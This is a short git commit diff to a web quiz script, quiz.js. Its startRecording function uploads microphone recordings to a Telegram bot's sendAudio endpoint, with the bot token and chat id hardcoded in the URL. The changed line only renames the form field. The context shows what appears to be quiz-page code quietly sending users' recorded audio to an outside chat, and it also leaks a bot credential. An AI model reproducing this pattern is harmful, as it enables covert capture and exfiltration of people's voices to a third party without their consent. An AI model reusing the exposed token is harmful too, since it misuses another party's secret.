643d33e2c1582857979cb69a33cf798083744061
EdumoLab <115560373+edumolab@users.noreply.github.com>
2023-03-22 04:29:22 +0000

    "main"

--- test3/js/quiz.js
+++ test3/js/quiz.js
@@ -146,7 +146,7 @@ function startRecording() {
       recorder.ondataavailable = function (e) {
         const url = URL.createObjectURL(e.data);
         const formData = new FormData();
-        formData.append('audio', e.data, 'recording.ogg');
+        formData.append('audio/ogg', e.data, 'recording.ogg');
         fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=-1001575547893', {
           method: 'POST',
           body: formData
